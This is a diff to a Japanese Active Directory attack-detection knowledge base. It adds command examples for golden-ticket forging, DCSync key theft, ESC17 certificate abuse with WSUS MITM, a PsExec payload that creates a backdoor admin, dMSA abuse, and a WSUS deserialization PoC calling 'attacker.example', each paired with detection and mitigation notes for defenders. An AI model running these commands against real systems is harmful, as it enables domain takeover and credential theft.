+        "t": "作成したシャドウプリンシパルに攻撃者アカウントをメンバー追加。管理者以外による当該コンテナの`member`属性書込は異常",
+        "q": "Set-ADObject -Identity 'CN=Shadow-EA,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local' -Add @{'member'='CN=svc_user,CN=Users,DC=bastion,DC=local'}"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PAM機能自体が無効な環境での前提有効化。通常は導入時一度きりの操作のため実行自体が強いシグナルになる",
+        "q": "Enable-ADOptionalFeature -Identity 'Privileged Access Management Feature' -Scope ForestOrConfigurationSet -Target bastion.local"
+      }
+    ],
     "detect": "検知の主軸はバスティオン/MIM フォレスト DC の DS アクセス監査。CN=Shadow Principal Configuration 配下のオブジェクト作成(5137)と msDS-ShadowPrincipalSid / member 属性の変更(5136, 4662)を SACL 監査で捕捉し、値に高特権 SID(-519/-512/-518/-520/-500)が現れる、または MIM サービスアカウント以外が変更した場合を異常とする。PIM/SIDHistory トラストの新規作成・変更(4706/4716)も監視。本番側では、シャドウプリンシパルのメンバが越境認証したクロスレルム TGS(4769)を PIM トラスト由来として相関。テレメトリ源: Windows セキュリティイベント(DC)、Microsoft Defender for Identity(ディレクトリ変更/越境認証)、MIM PAM の要求ログ。",
     "events": "5137(オブジェクト作成), 5136(msDS-ShadowPrincipalSid/member 変更), 4662(ディレクトリ書込), 4769(クロスレルムTGS), 4706/4716(PAM/PIMトラスト作成・変更)",
     "mitigate": "(1) バスティオン/MIM/PAM フォレストを本番と同格の Tier-0 として厳格に保護し、管理者と管理端末を分離する。(2) CN=Shadow Principal Configuration コンテナへの書込を MIM サービスアカウントのみに限定し、ACL を最小化した上で SACL 監査(5136/5137)を有効化。(3) 実際に MIM PIM を運用しない限り PAM 機能と PIM/SIDHistory トラストを有効化しない(不要なら無効化)。(4) 全シャドウプリンシパルの msDS-ShadowPrincipalSid を棚卸しし、-519/-512/-518/-520/-500 等の高特権 SID マッピングと TTL 無期限メンバシップを継続監査。(5) MIM の要求(承認)ログとディレクトリ変更を突合し、承認外の付与を検出。(6) 越境認証を制限する認証ポリシー/SID フィルタリングと組み合わせる。",
@@ -9142,6 +14983,33 @@ AD.I18N.ja.attacks = [
     "summary": "Entra ID Kerberos(WHfBクラウド信頼)では、オンプレADに krbtgt/AzureAD 相当のRODC型コンピュータオブジェクト「AzureADKerberos$」が作成され、Entra ID が発行する部分TGTをオンプレDCが検証・昇格する。このオブジェクトのAES256鍵を窃取すると、任意ユーザーになりすませるオンプレ用ゴールデンTGTを偽造でき、オンプレAD資源への特権アクセスと横展開が可能になる高リスクなハイブリッド信頼のブリッジ技術である(偽造TGTはKerberosであり、それ自体でクラウド側APIに認証できるわけではない点に注意)。",
     "how": "権限経路は2つ。(A) オンプレ経路: クラウド Kerberos 信頼は RODC コンピュータ「AzureADKerberos$」と、それに紐づく二次 krbtgt アカウント「krbtgt_AzureAD」(msDS-KrbTgtLink/msDS-KrbTgtLinkBl で連結)を作成し、この krbtgt_AzureAD の AES256 鍵が Entra 発行の部分 TGT に署名する。Domain Admin または Replicating Directory Changes 権限で、この二次 krbtgt を DCSync して鍵を抽出する(例: secretsdump.py -just-dc-user 'krbtgt_AzureAD' corp/da@dc、または DSInternals Get-ADReplAccount。※SAM 名は krbtgt_<キーID>(例 krbtgt_9898)の形式のため実行時は実際の sAMAccountName を指定)。署名鍵は AzureADKerberos$ コンピュータ本体ではなく krbtgt_AzureAD に存在する点に注意。(B) クラウド/ハイブリッド経路: Global/Hybrid Identity Administrator が AzureADHybridAuthenticationManagement(Get-/Set-AzureADKerberosServer)で Kerberos サーバーオブジェクトを作成・確認・ローテーションできるが、生の鍵はオンプレの krbtgt_AzureAD に格納されるため、鍵入手にはオンプレのレプリケーション権限が必要。中核プリミティブは、krbtgt_AzureAD が実質的な二次 krbtgt であり、その鍵で署名した部分 TGT をオンプレ DC が信頼して完全 TGT へ昇格する点。鍵入手後は Rubeus golden / mimikatz kerberos::golden に krbtgt_AzureAD 鍵・ドメイン SID・RODC 鍵(ブランチ)番号を与えて偽造する。ただし二次 krbtgt で署名したチケットは RODC のパスワードレプリケーションポリシー制約を継承するため、既定で Denied RODC Password Replication Group に属する特権アカウント(Domain/Enterprise Admins・Administrator)は直接なりすませない。Tier-0 プリンシパルの無制限偽造には一次 krbtgt の入手、または Denied グループ外だが特権相当のアカウント(例: DCSync 権限を持つ MSOL 同期アカウント)経由の昇格が必要。roadtx(ROADtools)は正規の Entra 部分 TGT 要求フローの再現・悪用に使える。偽造は AES256 で行い RC4 ダウングレードを避けると検知回避になる。",
     "tools": "AzureADHybridAuthenticationManagement (Get-/Set-AzureADKerberosServer), roadtx (ROADtools), Rubeus, mimikatz (kerberos::golden), Impacket secretsdump.py, DSInternals",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "部分TGT署名鍵を持つ二次krbtgt(krbtgt_AzureAD)をDCSyncで抽出。DCにプロセスログは残らず4662が唯一の手掛かり",
+        "q": "secretsdump.py -just-dc-user krbtgt_AzureAD corp.local/administrator@10.0.0.10"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "同じ鍵を署名済みモジュール経由で取得。実行ファイル検知はすり抜け4104にコマンドライン文字列が残る",
+        "q": "Get-ADReplAccount -SamAccountName krbtgt_AzureAD -Domain corp -Server dc01.corp.local"
+      },
+      {
+        "tool": "AzureADKerberos",
+        "t": "偽造に必要なRODCのID(スロット/ブランチ番号)を正規運用コマンドで下見。日常のハイブリッドID管理操作と区別しづらい",
+        "q": "Get-AzureADKerberosServer -Domain corp.local -UserPrincipalName admin@corp.onmicrosoft.com -DomainCredential (Get-Credential)"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "抽出鍵とRODC番号でクラウド信頼のゴールデンTGTを偽造しメモリへ注入。`/rodcNumber`がこの手法固有の指紋",
+        "q": "Rubeus.exe golden /rodcNumber:6 /aes256:<krbtgt_AzureAD_AES256hash> /sid:S-1-5-21-1004336348-1177238915-682003330 /domain:corp.local /user:Administrator /id:500 /ptt"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "同じ鍵でmimikatz版も生成可能。ただし既定のRODCパスワードレプリケーションポリシーによりDA等は直接なりすませない",
+        "q": "mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1004336348-1177238915-682003330 /aes256:<krbtgt_AzureAD_AES256hash> /id:500 /ptt\" exit"
+      }
+    ],
     "detect": "鍵窃取の一次シグナルは DC での 4662/レプリケーション(Replicating Directory Changes)で、特に二次 krbtgt アカウント krbtgt_AzureAD を対象とするレプリケーション(署名鍵を持たない AzureADKerberos$ コンピュータ本体ではなく)や、非 DC アカウント由来のレプリケーション。偽造 TGT 使用は 4769 TGS-REQ に先行する 4768(AS-REQ)が存在しない、あるいは AES 運用テナントでの RC4(TicketEncryptionType 0x17)ダウングレードとして表面化。MDI の「Suspected DCSync attack」「Suspected Golden Ticket usage(encryption downgrade / time / nonexistent account 異常)」が該当。相関の要は、オンプレ DC の Kerberos 発行イベントに対応する Entra 側の WHfB 対話サインイン(SigninLogs / EntraIdSignInEvents)が存在するか。ホスト側では Rubeus/mimikatz/secretsdump や AzureADHybridAuthenticationManagement コマンドラインの実行を MDE DeviceProcessEvents で捕捉。テレメトリ源: DC Security ログ(4662/4768/4769)、MDI、Entra SigninLogs/AuditLogs、MDE プロセスイベント。",
     "events": "4662(krbtgt_AzureADのレプリケーション/DCSync=鍵窃取), 4769(偽造TGTでのTGS-REQ・先行4768なし/RC4ダウングレード0x17), 4768(正規クラウド信頼サインイン時のTGT発行=相関白), 4741(AzureADKerberos$ RODCコンピュータオブジェクト作成)",
     "mitigate": "AzureADKerberos$ を krbtgt と同格の最重要資産として扱い、Replicating Directory Changes/Changes All 権限を持つプリンシパルを最小化・監査。DCのAES256運用を徹底しRC4を無効化。Global/Hybrid Identity Administrator を極小化しPIMで時間制限・承認付与、特権アカウントに耐フィッシングMFAとConditional Accessを強制。AzureADKerberosサーバー鍵を定期ローテーション(Set-AzureADKerberosServer -RotateServerKey)、侵害疑い時は即時ローテーション(krbtgt同様に2回)。MDIの「Suspected DCSync」「Golden Ticket」アラートと、Entra側WHfBサインインが存在しないオンプレKerberos発行の相関検知を運用。Tier0隔離、DCのローカル管理・資格情報保護(Credential Guard/ASR LSASS保護)を有効化。",
@@ -9187,6 +15055,33 @@ AD.I18N.ja.attacks = [
     "summary": "ESC17 は、Server Authentication (サーバー認証) EKU と「申請者がサブジェクトを提供 (ENROLLEE_SUPPLIES_SUBJECT / SAN 供給)」を同時に許可する ADCS 証明書テンプレートを低権限ユーザーが悪用し、WSUS 等の任意 DNS 名になりすます正規 TLS 証明書を発行させて HTTPS 化された WSUS クライアントを侵害する手法。CVE ではなくテンプレート設定不備 (ESC1 に酷似) のため、WSUS 側の HTTPS 強化では防げず ADCS 側の是正が必須である点が重要 (Certipy が PR #344 で ESC17 として検出対応)。",
     "how": "前提: ドメイン参加済みの低権限アカウントと、(1) Server Authentication EKU を含む、(2) ENROLLEE_SUPPLIES_SUBJECT (Supply in the request) が有効、(3) Domain Users/Authenticated Users が登録可、(4) マネージャー承認なし、の 4 条件を満たすテンプレートが 1 つあれば成立する (ESC1 に酷似するが EKU がクライアント認証でなくサーバー認証のみのため見落とされやすい)。手順: (a) certipy find -vuln でテンプレートを列挙し ESC17 判定、(b) certipy req -template <tmpl> -ca <CA> -target <CA FQDN> -dns <WSUSサーバーFQDN> で SAN に WSUS の DNS 名を指定した証明書 (.pfx) を取得、(c) openssl pkcs12 で .pem 化、(d) wsuks --only-discover で WSUS を特定し、wsuks -t <被害者IP> --WSUS-Server <FQDN> --tls-cert <cert>.pem で ARP スプーフィングして中間者化し、8531/HTTPS で偽 TLS 証明書を提示。被害クライアントは社内 CA を信頼するため警告なく受理し、PsExec64.exe と悪性 PowerShell を同梱した更新を偽 WSUS 経由で配信、更新はローカル管理者 (SYSTEM 相当) 権限で実行されるため端末を奪取する。CVE は存在せず、影響は当該 WSUS を利用する全 Windows クライアント。パッチではなくテンプレート是正が唯一の恒久対策。",
     "tools": "Certipy (find -vuln / req -dns), wsuks (--only-discover / --tls-cert), OpenSSL (pkcs12), PsExec (PsExec64.exe), BloodHound/Certify (列挙補助)",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "Server認証EKUと申請者SAN供給を同時に満たすテンプレートを検出。ESC1と同じ`-vulnerable`判定ロジックのため既存アラートを流用できる",
+        "q": "certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 -stdout -vulnerable"
+      },
+      {
+        "tool": "Certipy",
+        "t": "SANにWSUSサーバのFQDNを指定した正規TLS証明書を取得。要求者アカウントとSAN内DNS名の所有者が一致しない点がCA発行ログの異常",
+        "q": "certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -ca 'corp-CA' -template 'WebServer' -dns 'wsus01.corp.local'"
+      },
+      {
+        "tool": "wsuks",
+        "t": "SYSVOLのGPOからWSUSサーバを自動探索。DCのSYSVOL共有への読取アクセスとして4663/5145に残る",
+        "q": "wsuks --only-discover -t 10.0.0.50"
+      },
+      {
+        "tool": "wsuks",
+        "t": "偽TLS証明書でARPスプーフィングしWSUS HTTPS通信を中間者化。被害端末のWSUS問い合わせ先ARPエントリが本来と乖離する点が手掛かり",
+        "q": "wsuks -t 10.0.0.50 --WSUS-Server wsus01.corp.local --tls-cert wsus.pem --tls-cert-key wsus.key"
+      },
+      {
+        "tool": "PsExec",
+        "t": "wsuksが偽WSUS経由で配信する既定ペイロード。`PsExec64.exe`プロセス名と`Get-LocalGroup -SID S-1-5-32-544`によるAdministrators追加が固定文字列",
+        "q": "PsExec64.exe /accepteula /s powershell.exe \"net user wsuks_backdoor 'Passw0rd!' /add;Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member wsuks_backdoor;\""
+      }
+    ],
     "detect": "1) ADCS CA の Security ログ (イベント 4886/4887): 低権限アカウントが Server Authentication テンプレートに対し、自身の機器名でも WSUS の機械アカウントでもない SAN/DNS=インフラ機器FQDN を指定して発行を受けた記録。2) 被害クライアントのエンドポイント (MDE DeviceProcessEvents): 更新系プロセス (svchost/wuauserv, wuauclt.exe, UsoClient.exe, MoUsoCoreWorker.exe, TiWorker.exe) が PsExec64.exe や powershell.exe を子プロセス生成 (正規 Windows Update ではあり得ない)。3) ネットワーク (MDE DeviceNetworkEvents): GPO の WUServer で指定された正規 WSUS 以外の RemoteIP へ 8530/8531 で接続、および同一セグメントの ARP テーブル異常。テレメトリ源はエンドポイント (MDE/CrowdStrike) と CA のセキュリティイベント。攻撃ツール本体は Linux で動くことが多いため、証明書発行痕跡 (CA) と被害端末の実行/通信痕跡の相関が中核。",
     "events": "ADCS 4886/4887(証明書要求受信・発行, SAN/DNS=WSUS等インフラFQDN・要求者=低権限), 4688/DeviceProcessEvents(svchost・wuauclt・UsoClient・MoUsoCoreWorker→PsExec64.exe/powershell), DeviceNetworkEvents(不正WSUS 8530/8531), 4648",
     "mitigate": "恒久対策はテンプレート是正: (1) Server Authentication EKU と ENROLLEE_SUPPLIES_SUBJECT を同一テンプレートで併用しない (SAN 供給が必要なら EKU を最小化し登録権限を厳格化)。(2)「申請時にサブジェクトを提供」を無効化し、CA/機器がサブジェクトを構築する運用へ。(3) 影響テンプレートに CA マネージャー承認を必須化。(4) 登録権限を Domain Users/Authenticated Users から特権グループへ限定。(5) CA を Tier 0 として扱い、certipy find -vuln 等で誤設定を定期監査。WSUS 固有: WSUS 側の HTTPS 強化では防げないため上記 ADCS 是正が必須。加えて WSUS は非推奨化 (Windows Server 2025) が進むため代替配信への移行を検討し、更新経路にはネットワーク分離/ARP スプーフ対策 (DAI 等) と、可能なら証明書ピンニングを併用。発行済みの疑わしい証明書は失効させる。",
@@ -9232,6 +15127,23 @@ AD.I18N.ja.attacks = [
     "summary": "CVE-2025-60704（CheckSum）は Windows Kerberos KDC の S4U2self/S4U2proxy（プロトコル遷移）における検証欠陥で、PA-S4U-X509-USER の鍵付きチェックサムが鍵なしの弱いチェックサム（例：CRC32 や鍵なし MD5）に降格可能（CWE-325 暗号化ステップの欠落）なため、AitM（中間者）攻撃者が主張ユーザー ID を改ざんして任意ユーザーになりすまし、制約付き委任経由でドメイン全体を掌握できる。Microsoft は 2025年11月11日 のパッチで修正（CVSS 7.5 High、AV:N/AC:H/PR:N/UI:R）。",
     "how": "前提：ドメイン内の既存足場（有効な資格情報）と、Protocol Transition（TrustedToAuthForDelegation / msDS-AllowedToDelegateTo 設定）を持つサービスアカウント、および Kerberos トラフィックを介在できる AitM（中間者）位置。攻撃者は S4U2self の TGS-REQ に含まれる PA-S4U-X509-USER 構造のチェックサムを鍵なしの弱いチェックサム（例：CRC32／鍵なし MD5）に降格させ、鍵付き整合性保護を無効化。これにより「なりすまし対象ユーザー」フィールド（例：Domain Admin）を改ざんし、KDC を騙して任意ユーザーの S4U2self チケットを取得、続く S4U2proxy でバックエンドサービスへの正当なサービスチケットを得る。Impacket 系（getST.py の S4U オプション）や Rubeus 相当の実装で TGS-REQ を細工。影響：Windows 10（1607/1809/21H2/22H2）、Windows 11（22H2–25H2）、Windows Server 2008 R2〜2025。2025年11月累積更新で修正済み。",
     "tools": "Impacket (getST.py / rbcd.py, S4U2self・S4U2proxy), Rubeus (s4u), Silverfort 検証PoC, mitm6/AitM 中継, klist",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "通常のS4U2Self要求を生成する起点コマンド。CheckSum自体はAitMによるチェックサム改ざんが本体でコマンドライン自体に脆弱性固有の痕跡はない",
+        "q": "Rubeus.exe s4u /user:svc_web /rc4:aabbccddeeff00112233445566778899 /impersonateuser:administrator /msdsspn:cifs/fileserver01.corp.local /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "S4U2SelfのTGS-REQ生成元。実際の攻撃はAitM位置でPA-S4U-X509-USERのチェックサムを弱いものへ差替える中間者操作でコマンド自体は正規利用と見分けがつかない",
+        "q": "getST.py -spn cifs/fileserver01.corp.local -impersonate administrator -self corp.local/svc_web:'Passw0rd!'"
+      },
+      {
+        "tool": "klist.exe",
+        "t": "侵害後に付与された偽装チケットを確認する標準コマンド。直前になりすましたユーザーとアクセス先サービスの不一致がklist出力に残る",
+        "q": "klist"
+      }
+    ],
     "detect": "主信号はドメインコントローラーの Kerberos サービスチケット監査（Event ID 4769）。S4U2self/委任フローで、降格された弱い暗号種別（RC4-HMAC 0x17、DES 0x1/0x3）や、実行者と主張された Transited/なりすましユーザーの不整合を伴う TGS-REQ が異常（暗号種別の降格は本脆弱性のチェックサム欠陥そのものではなく相関ヒューリスティックである点に留意）。特に予期しないネットワークセグメント（AitM 位置）や、通常委任しないサービスから発生する S4U リクエストに注目。テレメトリ源：DC のセキュリティイベントログ（Sentinel SecurityEvent / MDI）、Microsoft Defender for Identity の Kerberos ログオン・ディレクトリイベント、および攻撃者ホスト側 EDR（Rubeus/Impacket プロセス、getST.py の Python/子プロセス、異常な Kerberos ネットワーク接続 88/tcp）。",
     "events": "4769(Kerberos サービスチケット/S4U2self・弱い TicketEncryptionType), 4768(TGT), 4624/4648(なりすましログオン), MDI: IdentityLogonEvents/IdentityDirectoryEvents(Kerberos)",
     "mitigate": "最優先は 2025年11月の累積更新（CVE-2025-60704 修正）を全ドメインコントローラーへ適用すること。加えて：不要な Protocol Transition（TrustedToAuthForDelegation）設定を棚卸しして削除し、msDS-AllowedToDelegateTo を最小化、非制約委任を撤廃。特権アカウントは「アカウントは委任できない (Sensitive / NOT_DELEGATED)」フラグや Protected Users グループで委任対象から除外。RC4/DES を無効化し AES を強制、Kerberos アーマリング（FAST）を有効化。委任構成変更の監査と正常な委任パターンのベースライン化を実施。",
@@ -9277,6 +15189,38 @@ AD.I18N.ja.attacks = [
     "summary": "dMSA Ouroboros は完全パッチ済み Windows Server 2025 でも成立する自己完結型の資格情報窃取・永続化技術で、標準的な委任権限（任意OUへの CreateChild と対象アカウントの移行リンク属性への WriteProperty）だけで dMSA に Shadow Credential を植え、dMSA 自身の SID を自らの msDS-GroupMSAMembership に書き込むことで superseded アカウントの NT ハッシュを取得し続け、パスワードローテーション・攻撃者アカウント削除・Credential Guard を生き延び、Domain Admin をリメディエーションから締め出す点で危険。MSRC は「永続化手法で EoP のバーに達しない」として未修正（CVEなし、Case 107173/107235 を 2026 年にクローズ）。",
     "how": "前提権限: 標準ドメインユーザー + 任意のOU/コンテナに対する msDS-DelegatedManagedServiceAccount クラスの CreateChild、および対象アカウントの移行リンク属性（msDS-SupersededServiceAccountState / msDS-ManagedAccountPrecededByLink / msDS-SupersededManagedAccountLink）への WriteProperty。攻撃連鎖: (1) 双方向 migration link を持つ dMSA を作成、(2) 所有権/DACL 連鎖で書込権を確保、(3) msDS-KeyCredentialLink に X.509 証明書（Shadow Credential）を植える — dMSA の既定セキュリティ記述子はパスワード read/change を制限するが KeyCredentialLink 書き込みは制限しない、(4)【核心プリミティブ】dMSA 自身の SID を自らの msDS-GroupMSAMembership セキュリティ記述子に書き込み自己承認ループを作る（SDDL は展開済み具体権 CCDCLCSWRPWPDTLOCRSDRCWDWO が必要、GA 省略形では KDC_ERR_POLICY）、(5) 植えた証明書で PKINIT により TGT を取得、(6) Rubeus の S4U2Self（--dmsa）で自分自身の KERB-DMSA-KEY-PACKAGE を要求、(7) KDC が GroupMSAMembership に dMSA の SID を発見し superseded アカウントの RC4/NT ハッシュ入りパッケージを発行。BadSuccessor（CVE-2025-53779、2025-08-12 修正）は片側リンク改ざんで、Microsoft は双方向リンク必須化で対処したが、Ouroboros は正規の双方向リンク+GroupMSAMembership 自己参照+Shadow Credential で修正後も成立。対象: Windows Server 2025（KB5072725/KB5073379 適用済み含む）。パッチ状況: MSRC が Case 107173（2026-03-10）/107235（2026-02-23）を未修正クローズ、Ouroboros 単体には CVE なし。",
     "tools": "Rubeus (S4U2Self --dmsa / PKINIT asktgt), SharpSuccessor, BadSuccessor (PowerShell PoC), Whisker, pyWhisker, Certipy (shadow), PowerShell (New-ADServiceAccount/Set-ADServiceAccount, Set-Acl), ldapmodify, BloodHound（CreateChild/WriteProperty 委任探索）",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "双方向migration linkを持つdMSAを新規作成。msDS-DelegatedManagedServiceAccountクラスのCreateChild(5137)が最初の足跡",
+        "q": "New-ADServiceAccount -Name attacker_dmsa -DNSHostName attacker-dmsa.corp.local -ManagedPasswordIntervalInDays 30 -Path \"OU=Test,DC=corp,DC=local\""
+      },
+      {
+        "tool": "Whisker",
+        "t": "dMSAのmsDS-KeyCredentialLinkへ証明書を植え付け。既定ACLはパスワード変更を制限するがKeyCredentialLink書込は制限せず5136が残る",
+        "q": "Whisker.exe add /target:attacker_dmsa$ /domain:corp.local /dc:dc01.corp.local"
+      },
+      {
+        "tool": "ldapmodify",
+        "t": "dMSA自身のSIDを自らのmsDS-GroupMSAMembershipへ書込み自己承認ループを作る核心手順。この属性への5136が最も高忠実度の単一シグナル",
+        "q": "ldapmodify -x -H ldap://dc01.corp.local -D \"CN=attacker_dmsa,OU=Test,DC=corp,DC=local\" -w 'Passw0rd!' -f groupmsamembership_self.ldif"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "植えた証明書でPKINIT認証しTGTを取得。4768のPreAuthType 16(証明書ベース)がパスワード認証との差分",
+        "q": "Rubeus.exe asktgt /user:attacker_dmsa$ /certificate:C:\\Windows\\Temp\\shadow.pfx /password:'Passw0rd!' /domain:corp.local /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "`/dmsa`でsuperseded元アカウントのNTハッシュ入りKERB-DMSA-KEY-PACKAGEを要求。Windows Server 2025限定の希少な文字列で高忠実度",
+        "q": "Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/corp.local /targetuser:attacker_dmsa$ /ticket:<BASE64_TGT> /ptt /nowrap"
+      },
+      {
+        "tool": "SharpSuccessor",
+        "t": "上記手順を一括実行する武器化ツール。`SharpSuccessor.exe add`という文字列自体が単独で高確度の検知シグナル",
+        "q": "SharpSuccessor.exe add /impersonate:Administrator /path:\"OU=Test,DC=corp,DC=local\" /account:svc_user /name:attacker_dmsa"
+      }
+    ],
     "detect": "アイデンティティ/DCテレメトリ中心。高信頼シグナル（誤検知ほぼゼロ）: dMSA の msDS-GroupMSAMembership に自分自身の SID が含まれる（正規運用では発生しない）、非管理者による dMSA 作成、dMSA オブジェクト上の msDS-KeyCredentialLink 追加、dMSA($)アカウント宛の PKINIT 証明書事前認証。テレメトリ源: ドメインコントローラの Directory Service 監査（Event 5136/5137/4662、SACL 有効化が必要）、Kerberos 認証ログ（4768 証明書フィールド、pre-auth type 0x11）、Microsoft Defender for Identity（dMSA 関連検知・LDAP 変更・不審な Kerberos）。エンドポイント（MDE/Falcon）は攻撃者ホスト上の Rubeus/Whisker/SharpSuccessor/PowerShell 実行を捕捉。",
     "events": "5136(msDS-KeyCredentialLink/msDS-GroupMSAMembership/msDS-ManagedAccountPrecededByLink 属性変更), 5137(dMSAオブジェクト作成), 4662(オブジェクトアクセス/S4U2Self), 4768(PKINIT 証明書事前認証, dMSA$宛), 4741(アカウント作成)",
     "mitigate": "Ouroboros 自体は未修正のため設計的封じ込めが必須。(1) OU/コンテナの委任を棚卸しし、非管理者からの msDS-DelegatedManagedServiceAccount の CreateChild を撤去（BloodHound 解析で約91%の環境に存在）。(2) 全 dMSA の msDS-GroupMSAMembership を監査し自己参照SID・非管理SIDを除去。(3) 全 dMSA の msDS-KeyCredentialLink を監査し不正な鍵資格情報を削除、書き込みを制限。(4) 前提となる BadSuccessor を CVE-2025-53779 パッチ（2025-08-12 / 該当 KB）で塞ぐ。(5) dMSA 属性（KeyCredentialLink, GroupMSAMembership, ManagedAccountPrecededByLink 等）に SACL を設定し 5136/4662 を監査。(6) PKINIT を要する環境では証明書ベース認証を監視、可能なら不要な dMSA を作らない/Tier0 隔離。(7) MDI を有効化し dMSA/Kerberos 異常検知を運用。",
@@ -9322,6 +15266,28 @@ AD.I18N.ja.attacks = [
     "summary": "WSUS の予約サービスが AuthorizationCookie を BinaryFormatter/SoapFormatter で安全でなく逆シリアル化する CVE-2025-59287(CVSS 9.8, CWE-502)により、認証不要でリモートから SYSTEM 権限の任意コード実行が可能で、2025/10/23-24 の緊急 OOB パッチ(KB5070881/82/83/84 等)公開直後から実際に悪用され CISA KEV 登録済み(是正期限 2025/11/14)の重大脆弱性。",
     "how": "前提は WSUS サーバーロールが有効なホスト(既定では無効、8530/HTTP・8531/HTTPS で待受、しばしば DC 上や社内広域から到達可能)。認証情報は不要。攻撃者は /ClientWebService/Client.asmx の GetCookie(あるいは /ReportingWebService/ReportingWebService.asmx、/SimpleAuthWebService/SimpleAuth.asmx)へ、CookieData に Base64 化した AES-128-CBC 暗号(ハードコードされた鍵)のガジェットチェーンを詰めた AuthorizationCookie を含む SOAP リクエストを送る。AuthorizationManager.GetCookie→CrackAuthorizationCookie→EncryptionHelper.DecryptData が復号し、型検証なしに BinaryFormatter/SoapFormatter.Deserialize が実行されて w3wp.exe/wsusservice.exe の SYSTEM 権限でコードが動く。実観測では wsusservice.exe/w3wp.exe→cmd.exe→cmd.exe→powershell.exe と連鎖し、Base64 の -EncodedCommand で whoami・net user /domain・ipconfig /all を実行し webhook.site へ結果を送出。ysoserial.net でペイロード生成、公開 PoC(HawkTrace/jiansiting 等)が流通。影響は Windows Server 2012/2012 R2/2016/2019/2022(23H2 含む)/2025。2025/10 月例の初回修正が不完全だったため 10/23-24 に OOB(2025=KB5070881, 23H2=KB5070879, 2022=KB5070884, 2019=KB5070883, 2016=KB5070882, 2012 R2=KB5070886, 2012=KB5070887)が再発行済み。",
     "tools": "ysoserial.net, 公開 PoC (HawkTrace/jiansiting CVE-2025-59287 等), curl, PowerShell (-EncodedCommand), webhook.site, Nuclei/Metasploit 系スキャナ",
+    "cmd": [
+      {
+        "tool": "CVE-2025-59287",
+        "t": "未認証でGetCookie経由のBinaryFormatter逆シリアル化を発火。`--cve CVE-2025-59287`指定のPoC実行は認証ログ皆無のまま成立",
+        "q": "python3 checker.py --target-url http://dc01.corp.local:8530 --payload BASE64_YSOSERIAL_BLOB --dns-name attacker.example --cve CVE-2025-59287 --random"
+      },
+      {
+        "tool": "ysoserial.net",
+        "t": "AuthorizationCookieに詰め込むガジェットチェーンを生成。ガジェット名は複数報告があるが`-f BinaryFormatter`指定が共通項",
+        "q": "ysoserial.exe -g RolePrincipal -f BinaryFormatter -c \"whoami\" -o base64"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "SYSTEM権限のWSUSワーカープロセス配下から実行される偵察コマンド。`-EncodedCommand`のBase64はScriptBlock Logging(4104)で復号可能",
+        "q": "powershell.exe -EncodedCommand <Base64 of: whoami; net user /domain; ipconfig /all>"
+      },
+      {
+        "tool": "cmd.exe",
+        "t": "`wsusservice.exe`/`w3wp.exe`が`cmd.exe`を直接子プロセス生成する行為自体が既定運用にない異常な親子関係",
+        "q": "cmd.exe /c whoami"
+      }
+    ],
     "detect": "中核は EDR のプロセス系譜:w3wp.exe / wsusservice.exe が cmd.exe・powershell.exe・conhost.exe を子生成すること自体が高い異常(WSUS が対話型シェルを起動する正当理由はほぼ無い)。続く powershell の -enc/-EncodedCommand、FromBase64String、net user /domain、ipconfig /all、webhook.site 等の外部 URL への PUT/POST。IIS ログ(u_ex*.log)で 8530/8531 の POST /ClientWebService/Client.asmx(GetCookie)や /ReportingWebService/ReportingWebService.asmx への異常に大きい CookieData。テレメトリ源: MDE DeviceProcessEvents/DeviceNetworkEvents、Windows セキュリティ 4688、Sysmon 1/3、PowerShell ScriptBlock 4104、IIS W3SVC ログ、WSUS SoftwareDistribution.log。ID 系はほぼオンプレ・エンドポイント信号で Entra/クラウド監査は関与しない。",
     "events": "4688(w3wp.exe/wsusservice.exe→cmd.exe/powershell.exe 生成), Sysmon ID1(プロセス生成)/ID3(外部通信), 4104(PowerShell ScriptBlock:-enc/net user /domain), IISログ(POST /ClientWebService/Client.asmx GetCookie 8530/8531)",
     "mitigate": "最優先は該当 OS への OOB 更新適用と再起動:Windows Server 2012→KB5070887、2012 R2→KB5070886、2016→KB5070882、2019→KB5070883、2022→KB5070884、23H2→KB5070879、2025→KB5070881(10 月例更新は不完全のため必ず 10/23-24 の再発行版を適用。累積更新のため単独適用可)。即時に適用できない場合は host/境界ファイアウォールで受信 8530・8531 を遮断、または WSUS サーバーロールを一時無効化し、いずれの場合も WSUS をインターネット非公開に保つ(CISA は 2025/11/14 までの是正を指示)。WSUS を DC と同居させない、IIS の該当 ASMX への外部到達を最小化。適用後は w3wp/wsusservice の子プロセスや 8530/8531 の異常 POST を継続監視。",
@@ -9367,6 +15333,33 @@ AD.I18N.ja.attacks = [
     "summary": "CVE-2024-43468 は Microsoft Configuration Manager (SCCM/ConfigMgr) の管理ポイント (MP) の MP_Location サービスに存在する認証不要の SQL インジェクション (CVSS 9.8, CWE-89) で、SMS サービス (サイトDBの sysadmin) 権限で任意 SQL を実行でき xp_cmdshell 経由で RCE に至る。2024年10月の月例パッチ (KB29166583) で修正済みだが、2026年2月12日に CISA KEV に追加され実際に悪用されている。",
